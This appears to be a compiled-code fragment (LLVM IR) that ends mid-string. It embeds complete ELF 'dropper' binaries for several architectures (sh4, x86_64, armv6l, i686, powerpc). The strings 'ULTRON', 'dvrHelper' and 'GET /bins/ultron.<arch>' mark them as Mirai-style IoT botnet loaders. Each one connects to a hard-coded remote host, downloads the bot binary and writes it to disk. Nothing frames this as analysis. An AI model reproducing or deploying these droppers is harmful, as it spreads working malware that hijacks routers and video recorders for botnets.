@.str.265 = private unnamed_addr constant [2049 x i8] c"\7FELF\01\01\01\00\00\00\00\00\00\00\00\00\02\00\08\00\01\00\00\00\E4\04@\004\00\00\00\E8\06\00\00\07\10\00\004\00 \00\03\00(\00\07\00\06\00\01\00\00\00\00\00\00\00\00\00@\00\00\00@\00T\06\00\00T\06\00\00\05\00\00\00\00\00\01\00\01\00\00\00`\06\00\00`\06D\00`\06D\00T\00\00\00p\00\00\00\06\00\00\00\00\00\01\00Q\E5td\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\07\00\00\00\04\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\FF\00\A50\00,\05\00\00&\04\00% \85\00\FF\00\E70\FF\00\C60% \87\00\002\06\00%0\C4\00\02\22\06\00\00\FF\C30\00\1A\03\00\00\FF\840\00\16\06\00\026\06\00%\10C\00%0\C4\00\08\00\E0\03%\10F\00\05\00\1C<d\85\9C'!\E0\99\03\5C\80\99\8F!(\80\00\08\00 \03\A1\0F\04$\05\00\1C<H\85\9C'!\E0\99\03\5C\80\99\8F!(\80\00\08\00 \03\A6\0F\04$\05\00\1C<,\85\9C'!\E0\99\03!\10\A0\00\5C\80\99\8F!8\C0\00!(\80\00!0@\00\08\00 \03\A5\0F\04$\05\00\1C<\04\85\9C'!\E0\99\03\D0\FF\BD'(\00\BF\AF\10\00\BC\AF\5C\80\99\8F\18\00\A4\AF\1C\00\A5\AF \00\A6\AF\06\10\04$\18\00\A6'\09\F8 \03\03\00\05$\10\00\BC\8F(\00\BF\8F\00\00\00\00\08\00\E0\030\00\BD'\05\00\1C<\B8\84\9C'!\E0\99\03!\10\A0\00\5C\80\99\8F!8\C0\00!(\80\00!0@\00\08\00 \03\A4\0F\04$\05\00\1C<\90\84\9C'!\E0\99\03!\10\A0\00\5C\80\99\8F!8\C0\00!(\80\00!0@\00\08\00 \03\A3\0F\04$\05\00\1C<h\84\9C'!\E0\99\03\D0\FF\BD'(\00\BF\AF\10\00\BC\AF\5C\80\99\8F\18\00\A4\AF\1C\00\A5\AF \00\A6\AF\06\10\04$\18\00\A6'\09\F8 \03\01\00\05$\10\00\BC\8F(\00\BF\8F\00\00\00\00\08\00\E0\030\00\BD'\05\00\1C<\1C\84\9C'!\E0\99\038\FF\BD'\C0\00\BF\AF\BC\00\B3\AF\B8\00\B2\AF\B4\00\B1\AF\B0\00\B0\AF\10\00\BC\AF\18\80\82\8F\00\00\00\00\00\06P$\00\00\02\82\00\00\00\00\FD\FF@\14\01\00\10&\FF\FF\10&\18\80\85\8F\18\80\82\8FH\80\99\8F\08\06\A5$\01\00\04$\07\00\06$\00\06B$\09\F8 \03#\98\02\02\10\00\BC\8F\02\00\02$L\80\99\8F\1C\00\A2\A7\00P\02$\D9\00\07$\A8\00\04$\EB\00\05$R\00\06$\09\F8 \03\1E\00\A2\A7\10\00\BC\8F\01\03\05$\18\80\84\8F`\80\99\8F\10\06\84$\FF\01\06$\09\F8 \03 \00\A2\AF\10\00\BC\8F\02\00\04$P\80\99\8F\02\00\05$!0\00\00\09\F8 \03!\90@\00!\88@\00\FF\FF\02$\10\00\BC\8F\03\00\22\12\00\00\00\00\07\00B\16\00\00\00\00T\80\99\8F\00\00\00\00\09\F8 \03\01\00\04$\10\00\BC\8F\00\00\00\00D\80\99\8F!  \02\1C\00\A5'\09\F8 \03\10\00\06$\10\00\BC\8F\0F\00A\04!\80@\00\18\80\85\8FH\80\99\8F\1C\06\A5$\01\00\04$\09\F8 \03\04\00\06$\10\00\BC\8F\00\00\00\00T\80\99\8F\00\00\00\00\09\F8 \03# \10\00\10\00\BC\8F\00\00\00\00\18\80\85\8FH\80\99\8F\1D\00p&$\06\A5$!  \02\09\F8 \03!0\00\02\10\00\BC\8F\07\00P\10!\80\00\00T\80\99\8F\00\00\00\00\09\F8 \03\03\00\04$\10\00\BC\8F!\80\00\008\80\99\8F!  \02\18\00\A5'\09\F8 \03\01\00\06$\10\00\BC\8F\01\00\03$T\80\99\8F\04\00C\10\04\00\04$\09\F8 \03\00\00\00\00\10\00\BC\8F\18\00\A3\83\00\12\10\00%\80C\00\0A\0D\02<\0A\0DB4\ED\FF\02\16\00\00\00\008\80\99\8F,\00\B0'!  \02!(\00\02\09\F8 \03\80\00\06$\10\00\BC\8F!(\00\02H\80\99\8F!0@\00\06\00@\18! @\02\09\F8 \03\00\00\00\00\10\00\BC\8F\F0\FF\00\10\00\00\00\00X\80\99\8F\00\00\00\00\09\F8 \03!  \02\10\00\BC\8F\00\00\00\00X\80\99\8F\00\00\00\00\09\F8 \03! @\02\10\00\BC\8F\01\00\04$\18\80\85\8FH\80\99\8FL\06\A5$\09\F8 \03\04\00\06$\10\00\BC\8F\00\00\00\00T\80\99\8F\00\00\00\00\09\F8 \03\05\00\04$\10\00\BC\8F\C0\00\BF\8F\BC\00\B3\8F\B8\00\B2\8F\B4\00\B1\8F\B0\00\B0\8F\08\00\E0\03\C8\00\BD'\05\00\1C<l\81\9C'!\E0\99\03!\00\E0\03\01\00\11\04\00\00\00\00\05\00\1C<T\81\9C'!\E0\9F\03!\F8\00\00<\80\99\8F\00\00\00\00\08\00 \03\00\00\00\00\00\00\00\00\05\00\1C<0\81\9C'!\E0\99\03!\10\80\00! \A0\00!(\C0\00!0\E0\00\10\00\A7\8F\14\00\A8\8F\18\00\A9\8F\1C\00\AA\8F\E0\FF\BD'\10\00\A8\AF\14\00\A9\AF\18\00\AA\AF\1C\00\A2\AF\1C\00\A2\8F\0C\00\00\00\03\00\E0\14 \00\BD'\08\00\E0\03\00\00\00\00! @\00@\80\99\8F\00\00\00\00\08\00 \03\00\00\00\00\00\00\00\00\05\00\1C<\C0\80\9C'!\E0\99\03\E0\FF\BD'\1C\00\BF\AF\18\00\B0\AF\10\00\BC\AF4\80\99\8F\00\00\00\00\09\F8 \03!\80\80\00\10\00\BC\8F\00\00P\AC\1C\00\BF\8F\18\00\B0\8F\FF\FF\02$\08\00\E0\03 \00\BD'\00\00\00\00\00\00\00\00\05\00\1C<p\80\9C'!\E0\99\030\80\82\8F\08\00\E0\03\00\00\00\00\00\00\00\00\00\00\00\00mipsel\00\00ULTRON\0A\00dvrHelper\00\00\00NIF\0A\00\00\00\00GET /bins/ultron.mipsel HTTP/1.0\0D\0A\0D\0A\00\00\00\00FIN\0A\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\80\00\00@\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\C0\06D\00\E0\05@\00\C0\01@\004\02@\00\90\05@\00L\01@\00\98\01@\00\A0\00@\00\E8\01@\00\EC\00@\00\08\01@\00 \05@\00$\01@\00\00.shstrtab\00.text\00.rodata\00.got\00.bss\00.mdebug.abi32\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00\A0\00@\00\A0\00\00\00`\05\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00\00\06@\00\00\06\00\00T\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\01\00\00\00\03\00\00\10`\06D\00`\06\00\00T\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\04\00\00\00\1E\00\00\00\08\00\00\00\03\00\00\00\C0\06D\00\B4\06\00\00\10\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00#\00\00\00\01\00\00\00\00\00\00\00H\00\00\00\B4\06\00\00\00\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\00\B4\06\00\001\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
@dropper_sh4 = global [2 x i8*] [i8* getelementptr inbounds ([2049 x i8], [2049 x i8]* @.str.265, i32 0, i32 0), i8* null], align 16
@dropper_x86_64 = global [2 x i8*] [i8* getelementptr inbounds ([1361 x i8], [1361 x i8]* @.str.266, i32 0, i32 0), i8* null], align 16
@.str.266 = private unnamed_addr constant [1361 x i8] c"\7FELF\02\01\01\00\00\00\00\00\00\00\00\00\02\00>\00\01\00\00\00V\03@\00\00\00\00\00@\00\00\00\00\00\00\00\10\04\00\00\00\00\00\00\00\00\00\00@\008\00\03\00@\00\05\00\04\00\01\00\00\00\05\00\00\00\00\00\00\00\00\00\00\00\00\00@\00\00\00\00\00\00\00@\00\00\00\00\00\EA\03\00\00\00\00\00\00\EA\03\00\00\00\00\00\00\00\00\10\00\00\00\00\00\01\00\00\00\06\00\00\00\EC\03\00\00\00\00\00\00\EC\03P\00\00\00\00\00\EC\03P\00\00\00\00\00\00\00\00\00\00\00\00\00\0C\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00Q\E5td\06\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\08\00\00\00\00\00\00\00\C1\E7\18H\C1\E6\10\0F\B6\C9\81\E6\00\00\FF\00Hc\FFH\C1\E2\08H\09\F7\81\E2\00\FF\00\00H\09\CFH\09\FA\89\D1\89\D0\81\E1\00\FF\00\00\C1\E0\18\C1\E1\08\09\C8H\89\D1\81\E2\00\00\FF\00\81\E1\00\00\00\FFH\C1\EA\08H\C1\E9\18\09\D1\09\C8\C3\89\FE1\C0\BF<\00\00\00\E9\12\02\00\00\89\FE1\C0\BF\03\00\00\00\E9\04\02\00\00\89\D11\C0\89\F2H\89\FE\BF\02\00\00\00\E9\F1\01\00\00\89\D11\C0H\89\F2\89\FE\BF*\00\00\00\E9\DE\01\00\00\89\D11\C0H\89\F2\89\FE\BF\01\00\00\00\E9\CB\01\00\00\89\D11\C0H\89\F2\89\FE1\FF\E9\BB\01\00\00\89\D11\C0\89\F2\89\FE\BF)\00\00\00\E9\A9\01\00\00AU\BA\A3\03@\00ATUSH\81\EC\A8\00\00\00\EB\03H\FF\C2\80z\FF\00u\F7\8D\05\CD\01\00\00A\89\D5\BE\A9\03@\00\BA\07\00\00\00\BF\01\00\00\00A)\C5\E8\8E\FF\FF\FF\B9\D9\00\00\00\BAR\00\00\00\BE\EB\00\00\00\BF\A8\00\00\00f\C7\84$\80\00\00\00\02\00f\C7\84$\82\00\00\00\00P\E8\CB\FE\FF\FF\BA\FF\01\00\00\BEA\02\00\00\BF\B1\03@\00\89\84$\84\00\00\00\E8 \FF\FF\FF1\D2\BE\01\00\00\00\BF\02\00\00\00A\89\C4\E8U\FF\FF\FF\83\F8\FF\89\C5\0F\94\C2A\83\FC\FF\0F\94\C0\08\C2t\0A\BF\01\00\00\00\E8\D3\FE\FF\FFH\8D\B4$\80\00\00\00\BA\10\00\00\00\89\EF\E8\EE\FE\FF\FF\85\C0\89\C3y\1D\BF\01\00\00\00\BA\04\00\00\00\BE\BB\03@\00\F7\DB\E8\E5\FE\FF\FF\89\DF\E8\9C\FE\FF\FFA\8D]\1D\BE\C0\03@\00\89\EF\89\DA\E8\CC\FE\FF\FF9\D8t\0A\BF\03\00\00\00\E8|\FE\FF\FF1\DBH\8D\B4$\9F\00\00\00\BA\01\00\00\00\89\EF\E8\BB\FE\FF\FF\FF\C8t\0A\BF\04\00\00\00\E8X\FE\FF\FF\0F\BE\84$\9F\00\00\00\C1\E3\08\09\C3\81\FB\0A\0D\0A\0Du\C9\BA\80\00\00\00H\89\E6\89\EF\E8\89\FE\FF\FF\85\C0~\0F\89\C2H\89\E6D\89\E7\E8e\FE\FF\FF\EB\DE\89\EF\E8(\FE\FF\FFD\89\E7\E8 \FE\FF\FF\BA\04\00\00\00\BE\E5\03@\00\BF\01\00\00\00\E8@\FE\FF\FF\BF\05\00\00\00\E8\F4\FD\FF\FFH\81\C4\A8\00\00\00[]A\5CA]\C3\E9X\FE\FF\FF\90H\89\F8H\89\F7H\89\D6H\89\CAM\89\C2M\89\C8L\8BL$\08\0F\05H=\01\F0\FF\FF\0F\83\03\00\00\00\C3\90\90H\83\EC\08H\89\C1H\F7\D9\E8\09\00\00\00\89\08\83\C8\FFZ\C3\90\90\B8\EC\03P\00\C3x86_64\00ULTRON\0A\00dvrHelper\00NIF\0A\00GET /bins/ultron.x86_64 HTTP/1.0\0D\0A\0D\0A\00FIN\0A\00\00\00\00.shstrtab\00.text\00.rodata\00.bss\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00\00\00\00\00\E8\00@\00\00\00\00\00\E8\00\00\00\00\00\00\00\BA\02\00\00\00\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00\00\00\00\00\A2\03@\00\00\00\00\00\A2\03\00\00\00\00\00\00H\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\19\00\00\00\08\00\00\00\03\00\00\00\00\00\00\00\EC\03P\00\00\00\00\00\EC\03\00\00\00\00\00\00\0C\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\EC\03\00\00\00\00\00\00\1E\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 1
@dropper_armv6l = global [2 x i8*] [i8* getelementptr inbounds ([1465 x i8], [1465 x i8]* @.str.267, i32 0, i32 0), i8* null], align 16
@.str.267 = private unnamed_addr constant [1465 x i8] c"\7FELF\01\01\01\00\00\00\00\00\00\00\00\00\02\00(\00\01\00\00\00\8C\83\00\004\00\00\00\A0\04\00\00\02\00\00\044\00 \00\03\00(\00\07\00\06\00\01\00\00\00\00\00\00\00\00\80\00\00\00\80\00\00P\04\00\00P\04\00\00\05\00\00\00\00\80\00\00\01\00\00\00P\04\00\00P\04\01\00P\04\01\00\0C\00\00\00\14\00\00\00\06\00\00\00\00\80\00\00Q\E5td\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\07\00\00\00\04\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\018\83\E1\00<\83\E1\024\83\E1\03\0C\A0\E1\02\08\80\E1\FF(\03\E2\22\04\80\E1#\0C\80\E1\1E\FF/\E1\04\E0-\E5\00\10\A0\E1\04\D0M\E2\01\00\A0\E3\AD\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\00\10\A0\E1\04\D0M\E2\06\00\A0\E3\A5\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\05\00\A0\E3\9A\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\0C\00\9F\E5\8F\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\1B\01\00\00\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\04\00\A0\E3\83\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\03\00\A0\E3x\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\0C\00\9F\E5m\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\19\01\00\00\F0A-\E9t1\9F\E5\98\D0M\E2\00\80\A0\E3\00\00\00\EA\01\80\88\E2\01`S\E5\00\00V\E3\010\83\E2\FA\FF\FF\1AT\11\9F\E5\07 \A0\E3\01\00\A0\E3\CF\FF\FF\EB\02\C0\A0\E3\D90\A0\E3\EB\10\A0\E3R \A0\E3\B4\C8\CD\E1\A8\00\A0\E3\05\CA\A0\E3\B6\C8\CD\E1\96\FF\FF\EB$\11\9F\E5\88\00\8D\E5 !\9F\E5 \01\9F\E5\AA\FF\FF\EB\01\10\A0\E3\00p\A0\E1\06 \A0\E1\02\00\A0\E3\D2\FF\FF\EB\01\00p\E3\01\00w\13\00P\A0\E1\01\00\A0\03\90\FF\FF\0B\05\00\A0\E1\84\10\8D\E2\10 \A0\E3\A7\FF\FF\EB\00@P\E2\05\00\00\AA\01\00\A0\E3\D8\10\9F\E5\04 \A0\E3\AD\FF\FF\EB\00\00d\E2\84\FF\FF\EB\1D@\88\E2\05\00\A0\E1\C0\10\9F\E5\04 \A0\E1\A6\FF\FF\EB\04\00P\E1\03\00\A0\13|\FF\FF\1B\AC\80\9F\E5\06@\A0\E1\97`\8D\E2\06\10\A0\E1\01 \A0\E3\05\00\A0\E1\A7\FF\FF\EB\01\00P\E3\04\00\A0\E3r\FF\FF\1B\970\DD\E5\04D\83\E1\08\00T\E1\F4\FF\FF\1A\04@\8D\E2\04\10\A0\E1\80 \A0\E3\05\00\A0\E1\9B\FF\FF\EB\00 P\E2\04\10\A0\E1\07\00\A0\E1\01\00\00\DA\8B\FF\FF\EB\F5\FF\FF\EA\05\00\A0\E1i\FF\FF\EB\07\00\A0\E1g\FF\FF\EB<\10\9F\E5\04 \A0\E3\01\00\A0\E3\82\FF\FF\EB\05\00\A0\E3Y\FF\FF\EB\98\D0\8D\E2\F0A\BD\E8\1E\FF/\E1\FD\83\00\00\04\84\00\00A\02\00\00\FF\01\00\00\0C\84\00\00\18\84\00\00 \84\00\00\0A\0D\0A\0DH\84\00\00\95\FF\FF\EA\0D\C0\A0\E1\F0\00-\E9\00p\A0\E1\01\00\A0\E1\02\10\A0\E1\03 \A0\E1x\00\9C\E8\00\00\00\EF\F0\00\BD\E8\01\0Ap\E3\0E\F0\A01\FF\FF\FF\EA\10@-\E9\00@\A0\E1\04\00\00\EB\00@d\E2\00@\80\E5\00\00\E0\E3\10@\BD\E8\1E\FF/\E1\0C0\9F\E5\0C\00\9F\E5\030\8F\E0\00\00\83\E0\1E\FF/\E1`\80\00\00\0C\00\00\00armv6l\00\00ULTRON\0A\00dvrHelper\00\00\00NIF\0A\00\00\00\00GET /bins/ultron.armv6l HTTP/1.0\0D\0A\0D\0A\00\00\00\00FIN\0A\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00A\0F\00\00\00aeabi\00\01\05\00\00\00\00.shstrtab\00.text\00.rodata\00.got\00.bss\00.ARM.attributes\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00\A0\80\00\00\A0\00\00\00\5C\03\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00\FC\83\00\00\FC\03\00\00T\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\01\00\00\00\03\00\00\00P\04\01\00P\04\00\00\0C\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\04\00\00\00\1E\00\00\00\08\00\00\00\03\00\00\00\5C\04\01\00\5C\04\00\00\08\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00#\00\00\00\03\00\00p\00\00\00\00\00\00\00\00\5C\04\00\00\10\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\00l\04\00\003\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
@dropper_i686 = global [2 x i8*] [i8* getelementptr inbounds ([1197 x i8], [1197 x i8]* @.str.268, i32 0, i32 0), i8* null], align 16
@.str.268 = private unnamed_addr constant [1197 x i8] c"\7FELF\01\01\01\00\00\00\00\00\00\00\00\00\02\00\03\00\01\00\00\00$\83\04\084\00\00\00\E4\03\00\00\00\00\00\004\00 \00\03\00(\00\05\00\04\00\01\00\00\00\00\00\00\00\00\80\04\08\00\80\04\08\C1\03\00\00\C1\03\00\00\05\00\00\00\00\10\00\00\01\00\00\00\C4\03\00\00\C4\93\04\08\C4\93\04\08\00\00\00\00\04\00\00\00\06\00\00\00\00\10\00\00Q\E5td\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\06\00\00\00\04\00\00\00U\89\E5\0F\B6U\08\0F\B6E\0C\0F\B6M\10\C1\E2\18\C1\E0\10\09\C2\0F\B6E\14\C1\E1\08]\09\C2\09\D1\89\CA\89\C8\81\E2\00\FF\00\00\C1\E2\08\C1\E0\18\09\D0\89\CA\81\E1\00\00\FF\00\C1\EA\18\C1\E9\08\09\CA\09\D0\C3U\89\E5\83\EC\10\FFu\08j\01\E8D\02\00\00\83\C4\10\C9\C3U\89\E5\83\EC\10\FFu\08j\06\E8/\02\00\00\C9\C3U\89\E5\83\EC\08\FFu\10\FFu\0C\FFu\08j\05\E8\17\02\00\00\C9\C3U\89\E5\83\EC\1C\8BE\08\89E\F4\8BE\0C\89E\F8\8BE\10\89E\FC\8DE\F4Pj\03jf\E8\F0\01\00\00\C9\C3U\89\E5\83\EC\08\FFu\10\FFu\0C\FFu\08j\04\E8\D8\01\00\00\C9\C3U\89\E5\83\EC\08\FFu\10\FFu\0C\FFu\08j\03\E8\C0\01\00\00\C9\C3U\89\E5\83\EC\1C\8BE\08\89E\F4\8BE\0C\89E\F8\8BE\10\89E\FC\8DE\F4Pj\01jf\E8\99\01\00\00\C9\C3U\B8}\83\04\08\89\E5WVS\81\EC\AC\00\00\00\EB\01@\808\00u\FA-}\83\04\08\89\85P\FF\FF\FFPj\07h\82\83\04\08j\01\E8v\FF\FF\FFh\D9\00\00\00jRh\EB\00\00\00h\A8\00\00\00f\C7E\E0\02\00f\C7E\E2\00P\E8\A6\FE\FF\FF\83\C4\1Ch\FF\01\00\00hA\02\00\00h\8A\83\04\08\89E\E4\E8\FB\FE\FF\FF\83\C4\0Cj\00j\01j\02\89\C7\E8Z\FF\FF\FF\83\C4\10\83\F8\FF\89\C6t\05\83\FF\FFu\0D\83\EC\0Cj\01\E8\AB\FE\FF\FF\83\C4\10Pj\10\8DE\E0PV\E8\DA\FE\FF\FF\83\C4\10\85\C0\89\C3y\1CP\F7\DBj\04h\94\83\04\08j\01\E8\E7\FE\FF\FF\89\1C$\E8y\FE\FF\FF\83\C4\10\8B\9DP\FF\FF\FFP\83\C3\1DSh\99\83\04\08V\E8\C6\FE\FF\FF\83\C4\109\D8t\0D\83\EC\0Cj\03\E8O\FE\FF\FF\83\C4\101\DBPj\01\8DE\F3PV\E8\BB\FE\FF\FF\83\C4\10Ht\0D\83\EC\0Cj\04\E8-\FE\FF\FF\83\C4\10\0F\BEE\F3\C1\E3\08\09\C3\81\FB\0A\0D\0A\0Du\CFQh\80\00\00\00\8D\9D`\FF\FF\FFSV\E8\84\FE\FF\FF\83\C4\10\85\C0~\0ERPSW\E8\5C\FE\FF\FF\83\C4\10\EB\D8\83\EC\0CV\E8\FD\FD\FF\FF\89<$\E8\F5\FD\FF\FF\83\C4\0Cj\04h\BC\83\04\08j\01\E85\FE\FF\FF\C7\04$\05\00\00\00\E8\C3\FD\FF\FF\83\C4\10\8De\F4[^_]\C3U\89\E5]\E9l\FE\FF\FF\90\90\90UWVS\8Bl$,\8B|$(\8Bt$$\8BT$ \8BL$\1C\8B\5C$\18\8BD$\14\CD\80[^_]=\01\F0\FF\FF\0F\83\01\00\00\00\C3\83\EC\0C\89\C2\F7\DA\E8\09\00\00\00\89\10\83\C8\FF\83\C4\0C\C3\B8\C4\93\04\08\C3i686\00ULTRON\0A\00dvrHelper\00NIF\0A\00GET /bins/ultron.i686 HTTP/1.0\0D\0A\0D\0A\00FIN\0A\00\00\00\00\00.shstrtab\00.text\00.rodata\00.bss\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00\94\80\04\08\94\00\00\00\E9\02\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00}\83\04\08}\03\00\00D\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\01\00\00\00\19\00\00\00\08\00\00\00\03\00\00\00\C4\93\04\08\C4\03\00\00\04\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\00\C4\03\00\00\1E\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
@dropper_powerpc = global [2 x i8*] [i8* getelementptr inbounds ([1421 x i8], [1421 x i8]* @.str.269, i32 0, i32 0), i8* null], align 16
@.str.269 = private unnamed_addr constant [1421 x i8] c"\7FELF\01\02\01\00\00\00\00\00\00\00\00\00\00\02\00\14\00\00\00\01\10\00\03\E8\00\00\004\00\00\04\C4\00\00\00\00\004\00 \00\03\00(\00\05\00\04\00\00\00\01\00\00\00\00\10\00\00\00\10\00\00\00\00\00\04\A4\00\00\04\A4\00\00\00\05\00\01\00\00\00\00\00\01\00\00\04\A4\10\01\04\A4\10\01\04\A4\00\00\00\00\00\00\00\08\00\00\00\06\00\01\00\00dt\E5Q\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\06\00\00\00\04T\84\80\1ETc\C0\0E|c#xT\A5@.|c3x|\A3\1BxN\80\00 |\08\02\A6\94!\FF\F0|d\1Bx8`\00\01\90\01\00\14L\C61\82H\00\03%\80\01\00\148!\00\10|\08\03\A6N\80\00 |\08\02\A6\94!\FF\F0|d\1Bx8`\00\06\90\01\00\14L\C61\82H\00\02\F9\80\01\00\148!\00\10|\08\03\A6N\80\00 |\08\02\A6\94!\FF\F0|\A6+x\90\01\00\14|\80#x|\05\03x|d\1Bx8`\00\05L\C61\82H\00\02\C1\80\01\00\148!\00\10|\08\03\A6N\80\00 \94!\FF\E0|\08\02\A6\90a\00\088`\00f\90\81\00\0C8\80\00\03\90\A1\00\108\A1\00\08\90\01\00$L\C61\82H\00\02\85\80\01\00$8!\00 |\08\03\A6N\80\00 |\08\02\A6\94!\FF\F0|\A6+x\90\01\00\14|\80#x|\05\03x|d\1Bx8`\00\04L\C61\82H\00\02M\80\01\00\148!\00\10|\08\03\A6N\80\00 |\08\02\A6\94!\FF\F0|\A6+x\90\01\00\14|\80#x|\05\03x|d\1Bx8`\00\03L\C61\82H\00\02\15\80\01\00\148!\00\10|\08\03\A6N\80\00 \94!\FF\E0|\08\02\A6\90a\00\088`\00f\90\81\00\0C8\80\00\01\90\A1\00\108\A1\00\08\90\01\00$L\C61\82H\00\01\D9\80\01\00$8!\00 |\08\03\A6N\80\00 \94!\FF@|\08\02\A6= \10\00\BF\81\00\B0;\A9\04P\90\01\00\C4H\00\00\08;\BD\00\01\88\1D\00\00/\80\00\00@\9E\FF\F4<\80\10\00= \10\009)\04P8\84\04X8\A0\00\078`\00\01\7F\A9\E8PK\FF\FF\0D8\00\00\028\C0\00\D98\80\00\EB8\A0\00R\B0\01\00\0C8`\00\A88\00\00P\B0\01\00\0EK\FF\FE\01\90a\00\10<`\10\008\80\02A8\A0\01\FF8c\04`K\FF\FE]8\80\00\01||\1Bx8\A0\00\008`\00\02K\FF\FF-/\83\FF\FF|~\1BxA\9E\00\0C/\9C\FF\FF@\BE\00\0C8`\00\01K\FF\FD\D5\7F\C3\F3x8\81\00\0C8\A0\00\10K\FF\FEU|\7F\1By@\A0\00 <\80\10\008`\00\018\84\04l8\A0\00\04K\FF\FEu|\7F\00\D0K\FF\FD\A1;\BD\00\1D<\80\10\008\84\04t\7F\C3\F3x\7F\A5\EBxK\FF\FEU\7F\83\E8\00A\9E\00\0C8`\00\03K\FF\FDy;\A0\00\008\81\00\088\A0\00\01\7F\C3\F3xK\FF\FEi/\83\00\018`\00\04A\9E\00\08K\FF\FDU\89a\00\08W\A9@.<\00\0D\0A}=[x`\00\0D\0A\7F\9D\00\00@\9E\FF\C8;\A1\00\1C8\A0\00\80\7F\A4\EBx\7F\C3\F3xK\FF\FE)\7F\A4\EBx|e\1By\7F\83\E3x@\81\00\0CK\FF\FD\DDK\FF\FF\D8\7F\C3\F3xK\FF\FD1\7F\83\E3xK\FF\FD)<\80\10\008\84\04\9C8\A0\00\048`\00\01K\FF\FD\B58`\00\05K\FF\FC\E1\80\01\00\C4\BB\81\00\B08!\00\C0|\08\03\A6N\80\00 K\FF\FE@|`\1Bx|\83#x|\A4+x|\C53x|\E6;x}\07CxD\00\00\02L\83\00 H\00\00\04|\08\02\A6\94!\FF\E0\BF\A1\00\14|}\1Bx\90\01\00$H\00\00!\93\A3\00\008`\FF\FF\80\01\00$\BB\A1\00\148!\00 |\08\03\A6N\80\00 <`\10\018c\04\A4N\80\00 powerpc\00ULTRON\0A\00dvrHelper\00\00\00NIF\0A\00\00\00\00GET /bins/ultron.powerpc 